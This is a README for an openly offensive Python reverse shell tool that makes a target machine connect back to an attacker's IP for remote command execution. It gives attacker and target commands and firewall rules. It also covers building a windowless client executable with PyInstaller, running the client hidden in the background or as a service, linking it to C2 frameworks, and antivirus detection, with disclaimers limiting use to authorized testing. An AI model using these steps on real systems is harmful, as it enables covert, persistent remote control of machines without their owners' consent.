# Reverse Shell Tool

A Python-based reverse shell implementation that allows remote command execution over a network connection.

## ⚠️ **DISCLAIMER & LEGAL WARNING**

**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY.**

- **Legal Use Only**: Only use this tool on systems you own or have explicit written permission to test
- **Unauthorized Access is Illegal**: Using this tool to access systems without permission violates computer fraud laws
- **Educational Purpose**: This project is for learning about network security, Python sockets, and ethical hacking principles
- **Responsible Disclosure**: If you find vulnerabilities, report them to system owners through proper channels

By using this tool, you agree that you are solely responsible for how it is used.

## 📋 **Features**

- **Cross-platform**: Works on Windows, Linux, and macOS
- **Persistent Connection**: Auto-reconnects if connection drops
- **Command Execution**: Full shell command execution with output redirection
- **Multiple IP Support**: Automatically detects and uses available network interfaces
- **Simple Setup**: Only requires Python on both machines (no external dependencies)

## 🏗️ **Project Structure**

```
reverse-shell/
├── server.py          # Attacker/listener (run on your machine)
├── client.py          # Target/connector (run on remote machine)
├── server_threaded.py # Threaded version for better responsiveness
├── server_simple.py   # Minimal server implementation
├── client_simple.py   # Minimal client implementation
└── README.md          # This documentation
```

## 🔧 **Setup & Installation**

### **Requirements**
- Python 3.6 or higher
- Network connectivity between machines
- Appropriate firewall permissions

### **Quick Start**

1. **Clone or download the files**
2. **On the attacker machine (where you want to receive the shell):**
   ```bash
   python server.py
   ```

3. **On the target machine:**
   ```bash
   python client.py [ATTACKER_IP]
   ```

## 🚀 **Usage Guide**

### **Basic Usage**

**Step 1: Start the listener (on attacker machine)**
```bash
# Default IP (will show available IPs)
python server.py

# Specify IP and port
python server.py 192.168.1.100 9001

# Use threaded version for better performance
python server_threaded.py
```

**Step 2: Run the client (on target machine)**
```bash
# Connect to attacker
python client.py 192.168.1.100

# Specify port (if not default 9001)
python client.py 192.168.1.100 4444

# Minimal version
python client_simple.py
```

### **Finding Your IP Address**

**On attacker machine:**
```bash
# Linux/Mac
ifconfig
ip addr show

# Windows
ipconfig

# Using Python
python -c "import socket; print(socket.gethostbyname(socket.gethostname()))"
```

Common IP ranges:
- `192.168.x.x` - Home/office networks
- `10.x.x.x` - Corporate networks
- `172.16.x.x` - Docker/WSL networks

### **Network Scenarios**

| Scenario | Attacker IP | Target Command |
|----------|------------|----------------|
| Same WiFi | `192.168.1.100` | `client.py 192.168.1.100` |
| WSL to Windows | `172.17.144.1` | `client.py 172.17.144.1` |
| Local testing | `127.0.0.1` | `client.py 127.0.0.1` |
| Over Internet* | Your public IP | `client.py [PUBLIC_IP]` |

*Requires port forwarding on router

## 📖 **Command Reference**

### **Server Commands**
```
shell> whoami          # Check current user
shell> ipconfig        # Network info (Windows)
shell> ifconfig        # Network info (Linux/Mac)
shell> dir             # List directory (Windows)
shell> ls              # List directory (Linux/Mac)
shell> cd [directory]  # Change directory
shell> pwd             # Print working directory
shell> exit            # Close connection
```

### **Special Features**
- **Auto-reconnect**: Client automatically reconnects if connection drops
- **Command timeout**: Commands timeout after 30 seconds to prevent hanging
- **Error handling**: Clear error messages for debugging
- **Platform detection**: Automatically uses correct shell (cmd.exe vs /bin/bash)

## 🔒 **Security Considerations**

### **Firewall Configuration**
You may need to allow the port through your firewall:

**Windows:**
```cmd
netsh advfirewall firewall add rule name="Python Reverse Shell" dir=in action=allow protocol=TCP localport=9001
```

**Linux:**
```bash
sudo ufw allow 9001/tcp
# or
sudo iptables -A INPUT -p tcp --dport 9001 -j ACCEPT
```

### **Encryption Warning**
⚠️ **This tool sends data in plaintext!**
- Commands and output are not encrypted
- Use only on trusted, isolated networks
- For production or sensitive environments, implement SSL/TLS encryption

## 🛠️ **Troubleshooting**

### **Common Issues**

**"Connection refused"**
- Server isn't running
- Wrong IP address
- Firewall blocking connection
- Port already in use

**"Can't type after first command"**
- Use the threaded version: `server_threaded.py`
- Or add timeout: `client.settimeout(2.0)`

**"No output received"**
- Check if command actually produces output
- Try simple commands first: `whoami`, `echo test`
- Check client's network connectivity

**"Permission denied"**
- Client may be running with limited privileges
- Try running as administrator/root if needed

### **Testing Connectivity**

**From target to attacker:**
```bash
# Test if port is open
telnet [ATTACKER_IP] 9001
# or
nc -zv [ATTACKER_IP] 9001

# Test with Python
python -c "import socket; s=socket.socket(); s.connect(('[ATTACKER_IP]',9001)); print('Connected')"
```

## 🧪 **Testing & Development**

### **Local Testing**
Test everything locally first:

1. **Terminal 1 (server):**
   ```bash
   python server.py 127.0.0.1
   ```

2. **Terminal 2 (client):**
   ```bash
   python client.py 127.0.0.1
   ```

### **Building Executables**
Create standalone executables (no Python needed on target):

```bash
# Install PyInstaller
pip install pyinstaller

# Build client
pyinstaller --onefile --noconsole client.py

# Build server
pyinstaller --onefile server.py
```

Executables will be in the `dist/` folder.

## 📚 **How It Works**

### **Technical Overview**
1. **Server** binds to a port and listens for incoming connections
2. **Client** connects to the server's IP and port
3. **Command loop**:
   - Server sends commands to client
   - Client executes commands locally
   - Client sends output back to server
   - Server displays output to user

### **Key Components**
- **Socket Programming**: TCP sockets for reliable communication
- **Subprocess Module**: Secure command execution
- **Platform Detection**: OS-specific command handling
- **Error Recovery**: Auto-reconnection logic

## ⚡ **Advanced Usage**

### **Custom Ports**
```bash
# Server on custom port
python server.py 0.0.0.0 4444

# Client connecting to custom port
python client.py [IP] 4444
```

### **Background Execution**
**Linux/Mac client:**
```bash
# Run in background
nohup python client.py [IP] > /dev/null 2>&1 &

# As a service
sudo cp client.py /usr/local/bin/
sudo systemctl create reverse-shell.service
```

### **Integration with Other Tools**
Can be integrated with:
- Metasploit Framework
- Cobalt Strike
- Custom C2 frameworks
- Monitoring systems

## 🤝 **Contributing**

Found a bug or have a feature request?
1. Check existing issues
2. Fork the repository
3. Create a feature branch
4. Submit a pull request

### **Planned Features**
- [ ] SSL/TLS encryption
- [ ] File transfer capabilities
- [ ] Multiple client support
- [ ] Web-based interface
- [ ] Built-in port scanner

## 📄 **License**

This project is for educational purposes only. Users are solely responsible for complying with all applicable laws.

## ❓ **FAQ**

**Q: Does this work over the internet?**
A: Yes, but you need port forwarding on your router and to use your public IP.

**Q: Is this detectable by antivirus?**
A: Python scripts are often flagged. Compiled executables may be detected as malware.

**Q: Can I use this on my company's network?**
A: Only with explicit written permission from network administrators.

**Q: Why does the connection drop?**
A: Network issues, firewalls, or timeout settings. The auto-reconnect should handle this.

**Q: How do I stop it?**
A: Type `exit` on server, or Ctrl+C on both ends.

## 🆘 **Support**

For issues and questions:
1. Check the troubleshooting section
2. Review code comments
3. Test with the simple versions first
4. Ensure network connectivity

---

**Remember**: With great power comes great responsibility. Use this knowledge ethically and legally.

*Last Updated: 2024*
